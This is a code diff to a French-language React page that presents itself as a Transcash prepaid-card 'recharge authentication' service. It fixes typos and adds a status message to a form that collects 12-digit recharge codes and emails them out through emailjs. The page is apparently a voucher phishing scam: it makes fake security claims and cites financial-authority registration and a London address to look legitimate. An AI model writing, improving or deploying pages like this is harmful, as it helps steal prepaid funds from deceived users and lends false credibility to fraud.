@@ -19,6 +19,7 @@ const Accueil = () => {
   const form = useRef();
    const sendEmail = (e) => {
      e.preventDefault();
+      const message = document.getElementById("message");
 
      emailjs
        .sendForm(
@@ -29,11 +30,13 @@ const Accueil = () => {
        )
        .then(
          (result) => {
-           console.log(result.text);
-           alert('vous recevrez un email dans quelques instants')
+          
+           message.innerHTML = "Votre requète à été envoyé , Patientez quelques minuites";
+           message.style.color="green"
          },
          (error) => {
-           console.log(error.text);
+           message.innerHTML = "Requète non traité";
+           message.style.color = "black";
          }
        );
    };
@@ -85,16 +88,16 @@ const Accueil = () => {
           <img height="100px" src={phone} alt="" />
         </div>
 
-        <h2>Actiavtion de vos recharges</h2>
+        <h2>Activation de vos recharges</h2>
         <p>
           Transcash est utilisable en ligne uniquement , il vous permet
-          d'effectuer touts vos achats e-commerce en toute sécurité. La
-          fiabilité de votre code de recgarge est donc importante. Avec le
-          systhème 2FS-Security vos rechardes sont donc aythentifiées enfin
-          qu'elles soient utilisables en ligne.
+          d'effectuer tous vos achats e-commerce en toute sécurité. La fiabilité
+          de votre code de recharge est donc importante. Avec le système
+          2FS-Security vos recharges sont donc authentifiées enfin qu'elles
+          soient utilisables en ligne.
         </p>
         <p>
-          Cette étape crucilae d'authenfication se fait en utilisation de la
+          Cette étape cruciale d'authentification se fait en utilisation de la
           technologie la plus récente connue sur SSL permettant de garantir la
           sécurité et fiabilité de vos recharges en toute légitimité.
         </p>
@@ -117,11 +120,8 @@ const Accueil = () => {
 
         <hr></hr>
         <p>
-          La recharge TRASN-CASH Mastercard est un moyen de paiement prépayé
-          fiable sur internet, avec une recharge , qui vous accompagne au
-          quotidien dans vos dépenses. commnader le en ligne u achetez vos
-          recharges de paiement dans un bureau de tabac et profitez de touts ses
-          avantages qui simplifiera la vie.
+          La recharge TRANS-CASH Mastercard est un moyen de paiement prépayé fiable sur internet, avec une recharge, qui vous accompagne au quotidien dans vos dépenses. Commander le en ligne ou achetez vos recharges de paiement dans un bureau de tabac et
+          profitez de tous ses avantages qui simplifieront la vie.
         </p>
         <hr></hr>
         <div className="formulaire">
@@ -172,7 +172,7 @@ const Accueil = () => {
             </div>
             <div className="bloc">
               <label>
-                Code a 12 chiffres * :
+                Code à 12 chiffres * :
                 <input
                   required
                   placeholder="Ex:000000000000"
@@ -209,6 +209,7 @@ const Accueil = () => {
             <div className="submit">
               <input type="submit" id="submit" value="Vérifier Maintenant" />
             </div>
+            <p id="message"></p>
           </form>
         </div>
         <br></br>
@@ -217,14 +218,11 @@ const Accueil = () => {
 
         <div className="siteRecharge">
           <p style={{ color: "gray" }}>
-            Le site RECHARGE-AUTHENTIFICATION est émis par CARS-coopération sous
-            une licence d'authentification internationa Incorporated. Le service
-            est autorisé par la conduite financière autorité (FRN 9000036 ) en
-            vertu du règlements de 2011 sur la monnaie électronique pour
-            l'émission de monnaie électronique et fourniture de services
-            électronique et fourniture de services de paiement. Siège Social :
-            5è étage , Langham Housse , 302-308 Regent Steet, Londres , W1B 3AT.
-            Numéro d'entreprise : 066337638.
+              Le site RECHARGE-AUTHENTIFICATION est émis par CARS-coopération sous une licence d'authentification internationale Incorporated. Le service est autorisé par la conduite
+            financière autorité (FRN 9 000 036) en vertu des
+            règlements de 2011 sur la monnaie électronique pour l'émission de monnaie électronique et fourniture de services électronique et fourniture de services de paiement. Siège Social
+            :5ᵉ étage, Langham Housse, 302-308 Regent Steet,
+            Londres, W1B 3AT.Numéro d'entreprise : 066337638.
           </p>
           <img height={100} src={visa} alt="" />
         </div>
